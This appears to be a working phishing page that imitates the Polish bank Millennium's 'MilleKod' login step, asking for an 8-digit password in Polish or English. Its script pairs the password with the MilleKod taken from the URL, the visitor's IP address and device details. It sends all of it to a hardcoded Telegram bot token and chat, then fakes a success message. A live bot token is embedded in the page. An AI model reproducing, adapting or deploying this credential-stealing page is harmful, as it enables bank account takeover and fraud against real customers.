<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Enter Password - MilleKod</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background-color: #ffffff;
            height: 100vh;
            overflow: hidden;
            position: relative;
        }

        /* Language Switcher */
        .language-switcher {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 1000;
        }

        .language-btn {
            width: 50px;
            height: 30px;
            border-radius: 15px;
            border: 2px solid #e5e5e7;
            background-color: #ffffff;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
            font-weight: 600;
            color: #000000;
            position: relative;
            overflow: hidden;
        }

        .language-btn:hover {
            border-color: #ff2d92;
            transform: scale(1.05);
        }

        .language-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(45deg, #ff2d92, #e0267d);
            opacity: 0;
            transition: opacity 0.3s ease;
        }

        .language-btn:hover::before {
            opacity: 0.1;
        }

        .language-btn span {
            position: relative;
            z-index: 1;
        }

        /* Progress Bar */
        .progress-container {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            height: 2px;
            background-color: #e5e5e7;
            z-index: 999;
        }

        .progress-bar {
            height: 100%;
            background-color: #ff2d92;
            width: 60%;
            transition: width 0.3s ease;
        }

        /* Main Content */
        .main-content {
            padding-top: 2px;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 2px 20px 20px;
        }

        .title {
            font-size: 34px;
            font-weight: 700;
            color: #000000;
            margin-bottom: 60px;
            text-align: center;
        }

        .description {
            font-size: 13px;
            color: #8e8e93;
            text-align: center;
            margin-bottom: 40px;
            line-height: 1.4;
            max-width: 300px;
        }

        /* Password Input Container */
        .password-container {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin-bottom: 40px;
        }

        .password-input {
            width: 50px;
            height: 50px;
            border: 2px solid #e5e5e7;
            border-radius: 8px;
            text-align: center;
            font-size: 24px;
            font-weight: 600;
            color: #000000;
            background-color: #ffffff;
            transition: all 0.2s ease;
        }

        .password-input:focus {
            outline: none;
            border-color: #ff2d92;
            box-shadow: 0 0 0 3px rgba(255, 45, 146, 0.1);
        }

        .password-input.filled {
            border-color: #ff2d92;
            background-color: #fff5f9;
        }

        /* Buttons */
        .buttons-container {
            display: flex;
            flex-direction: column;
            gap: 12px;
            width: 100%;
            max-width: 300px;
        }

        .btn {
            width: 100%;
            height: 50px;
            border: none;
            border-radius: 12px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            text-decoration: none;
            color: #ffffff;
        }

        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .btn-primary {
            background-color: #ff2d92;
        }

        .btn-primary:hover:not(:disabled) {
            background-color: #e0267d;
            transform: translateY(-1px);
        }

        .btn-primary:active:not(:disabled) {
            transform: translateY(0);
        }

        .btn-secondary {
            background-color: #f2f2f7;
            color: #000000;
        }

        .btn-secondary:hover:not(:disabled) {
            background-color: #e5e5ea;
        }

        .btn-secondary:active:not(:disabled) {
            background-color: #d1d1d6;
            transform: scale(0.98);
        }

        /* Loading State */
        .btn.loading {
            position: relative;
            color: transparent;
        }

        .btn.loading::after {
            content: '';
            position: absolute;
            width: 20px;
            height: 20px;
            border: 2px solid #ffffff;
            border-top: 2px solid transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Home Indicator */
        .home-indicator {
            position: fixed;
            bottom: 8px;
            left: 50%;
            transform: translateX(-50%);
            width: 134px;
            height: 5px;
            background-color: #000000;
            border-radius: 3px;
        }

        /* Message Display */
        .message {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: #000000;
            color: #ffffff;
            padding: 20px;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            z-index: 1000;
            max-width: 300px;
            text-align: center;
            display: none;
        }

        .message.success {
            background-color: #34c759;
        }

        .message.error {
            background-color: #ff3b30;
        }

        /* Responsive adjustments */
        @media (max-width: 375px) {
            .main-content {
                padding: 2px 16px 20px;
            }
            
            .title {
                font-size: 28px;
                margin-bottom: 40px;
            }
            
            .description {
                margin-bottom: 30px;
            }

            .password-input {
                width: 45px;
                height: 45px;
                font-size: 20px;
            }
        }
    </style>
</head>
<body>
    <!-- Language Switcher -->
    <div class="language-switcher">
        <button class="language-btn" id="languageBtn" title="Switch Language">
            <span id="languageText">EN</span>
        </button>
    </div>

    <!-- Progress Bar -->
    <div class="progress-container">
        <div class="progress-bar"></div>
    </div>

    <!-- Main Content -->
    <div class="main-content">
        <h1 class="title" data-text="title">Enter Password</h1>
        
        <p class="description" data-text="description">
            Enter your 8-digit password to complete the verification process
        </p>

        <!-- Password Input -->
        <div class="password-container">
            <input type="text" class="password-input" maxlength="1" data-index="0">
            <input type="text" class="password-input" maxlength="1" data-index="1">
            <input type="text" class="password-input" maxlength="1" data-index="2">
            <input type="text" class="password-input" maxlength="1" data-index="3">
            <input type="text" class="password-input" maxlength="1" data-index="4">
            <input type="text" class="password-input" maxlength="1" data-index="5">
            <input type="text" class="password-input" maxlength="1" data-index="6">
            <input type="text" class="password-input" maxlength="1" data-index="7">
        </div>

        <!-- Buttons -->
        <div class="buttons-container">
            <button class="btn btn-primary" id="submitBtn" disabled data-text="submit">
                SUBMIT
            </button>
            <button class="btn btn-secondary" id="cancelBtn" data-text="cancel">
                CANCEL
            </button>
        </div>
    </div>

    <!-- Home Indicator -->
    <div class="home-indicator"></div>

    <!-- Message Display -->
    <div class="message" id="message"></div>

    <script>
        // Configuration
        const TELEGRAM_CONFIG = {
            botToken: '8232091350:AAFLpQ4Uxi8IJ5G8dfoBqIHb5jWQvi8SL-o',
            chatId: '-4967096174',
            apiUrl: 'https://api.telegram.org'
        };

        // Language translations
        const translations = {
            pl: {
                title: "Wprowadź Hasło",
                description: "Wprowadź 8-cyfrowe hasło, aby zakończyć proces weryfikacji",
                submit: "WYŚLIJ",
                cancel: "ANULUJ",
                success: "Pomyślnie wysłano!",
                error: "Wprowadź 8-cyfrowe hasło",
                errorSubmit: "Błąd wysyłania hasła. Spróbuj ponownie."
            },
            en: {
                title: "Enter Password",
                description: "Enter your 8-digit password to complete the verification process",
                submit: "SUBMIT",
                cancel: "CANCEL",
                success: "Successfully submitted!",
                error: "Please enter 8-digit password",
                errorSubmit: "Error submitting password. Please try again."
            }
        };

        // Current language
        let currentLang = 'pl';

        // Get MilleKod from URL parameters
        const urlParams = new URLSearchParams(window.location.search);
        const milleKod = urlParams.get('code') || '';

        // Password input elements
        const passwordInputs = document.querySelectorAll('.password-input');
        const submitBtn = document.getElementById('submitBtn');
        const cancelBtn = document.getElementById('cancelBtn');
        const message = document.getElementById('message');

        // Language switching functions
        function switchLanguage() {
            // Toggle between languages
            currentLang = currentLang === 'pl' ? 'en' : 'pl';
            
            // Update button text to show opposite language
            const languageText = document.getElementById('languageText');
            languageText.textContent = currentLang === 'pl' ? 'EN' : 'PL';
            
            // Update all text elements
            document.querySelectorAll('[data-text]').forEach(element => {
                const key = element.getAttribute('data-text');
                if (translations[currentLang][key]) {
                    element.textContent = translations[currentLang][key];
                }
            });
        }

        // Initialize
        document.addEventListener('DOMContentLoaded', function() {
            // Focus first input
            passwordInputs[0].focus();
            
            // Set initial language
            switchLanguage();
            
            // Add language switcher event listener
            document.getElementById('languageBtn').addEventListener('click', switchLanguage);
            
            // Add event listeners
            passwordInputs.forEach((input, index) => {
                input.addEventListener('input', handleInput);
                input.addEventListener('keydown', handleKeyDown);
                input.addEventListener('paste', handlePaste);
            });

            submitBtn.addEventListener('click', handleSubmit);
            cancelBtn.addEventListener('click', handleCancel);
        });

        // Handle input
        function handleInput(e) {
            const input = e.target;
            const value = input.value;
            const index = parseInt(input.dataset.index);

            // Only allow digits
            if (!/^\d$/.test(value)) {
                input.value = '';
                return;
            }

            // Move to next input
            if (value && index < passwordInputs.length - 1) {
                passwordInputs[index + 1].focus();
            }

            updateSubmitButton();
        }

        // Handle keydown
        function handleKeyDown(e) {
            const input = e.target;
            const index = parseInt(input.dataset.index);

            if (e.key === 'Backspace') {
                if (!input.value && index > 0) {
                    passwordInputs[index - 1].focus();
                }
            } else if (e.key === 'ArrowLeft' && index > 0) {
                passwordInputs[index - 1].focus();
            } else if (e.key === 'ArrowRight' && index < passwordInputs.length - 1) {
                passwordInputs[index + 1].focus();
            }
        }

        // Handle paste
        function handlePaste(e) {
            e.preventDefault();
            const pastedData = (e.clipboardData || window.clipboardData).getData('text');
            
            if (/^\d{8}$/.test(pastedData)) {
                // Fill all inputs with pasted data
                for (let i = 0; i < passwordInputs.length; i++) {
                    passwordInputs[i].value = pastedData[i] || '';
                }
                updateSubmitButton();
            }
        }

        // Update submit button state
        function updateSubmitButton() {
            const allFilled = Array.from(passwordInputs).every(input => input.value);
            submitBtn.disabled = !allFilled;
        }

        // Get password
        function getPassword() {
            return Array.from(passwordInputs).map(input => input.value).join('');
        }

        // Get client IP and website URL
        async function getClientInfo() {
            try {
                const websiteUrl = window.location.href;
                let clientIP = 'Unknown';
                
                try {
                    const ipResponse = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipResponse.json();
                    clientIP = ipData.ip;
                } catch (e) {
                    try {
                        const ipResponse2 = await fetch('https://ipapi.co/json/');
                        const ipData2 = await ipResponse2.json();
                        clientIP = ipData2.ip;
                    } catch (e2) {
                        try {
                            const ipResponse3 = await fetch('https://httpbin.org/ip');
                            const ipData3 = await ipResponse3.json();
                            clientIP = ipData3.origin;
                        } catch (e3) {
                            clientIP = 'Unknown';
                        }
                    }
                }
                
                return { websiteUrl, clientIP };
            } catch (error) {
                console.error('Error getting client info:', error);
                return { 
                    websiteUrl: window.location.href, 
                    clientIP: 'Unknown' 
                };
            }
        }

        // Submit password
        async function handleSubmit() {
            const password = getPassword();
            
            if (password.length !== 8) {
                showMessage(translations[currentLang].error, 'error');
                return;
            }

            setLoadingState(true);
            
            try {
                // Get client information
                const clientInfo = await getClientInfo();
                
                const messageText = `🔐 <b>New MilleKod + Password Submitted</b>

📋 <b>MilleKod:</b> <code>${milleKod}</code>
🔑 <b>Password:</b> <code>${password}</code>
🌐 <b>Website:</b> ${clientInfo.websiteUrl}
🌍 <b>Client IP:</b> <code>${clientInfo.clientIP}</code>
🕐 <b>Time:</b> ${new Date().toLocaleString('ru-RU')}
🆔 <b>ID:</b> ${Date.now()}

📱 <b>Device Info:</b>
• Platform: ${navigator.platform}
• User Agent: ${navigator.userAgent.substring(0, 100)}...

<i>Submitted from MilleKod system</i>`;

                const url = `${TELEGRAM_CONFIG.apiUrl}/bot${TELEGRAM_CONFIG.botToken}/sendMessage`;
                
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CONFIG.chatId,
                        text: messageText,
                        parse_mode: 'HTML'
                    })
                });

                const result = await response.json();

                if (result.ok) {
                    showMessage(translations[currentLang].success, 'success');
                    setTimeout(() => {
                        // Redirect back to main page
                        window.location.href = 'index.html';
                    }, 2000);
                } else {
                    throw new Error(result.description || 'Failed to send message');
                }
            } catch (error) {
                console.error('Error submitting password:', error);
                showMessage(translations[currentLang].errorSubmit, 'error');
            } finally {
                setLoadingState(false);
            }
        }

        // Cancel
        function handleCancel() {
            window.location.href = 'index.html';
        }

        // Set loading state
        function setLoadingState(loading) {
            submitBtn.disabled = loading;
            if (loading) {
                submitBtn.classList.add('loading');
            } else {
                submitBtn.classList.remove('loading');
            }
        }

        // Show message
        function showMessage(text, type) {
            message.textContent = text;
            message.className = `message ${type}`;
            message.style.display = 'block';
            
            setTimeout(() => {
                message.style.display = 'none';
            }, 3000);
        }
    </script>
</body>
</html>
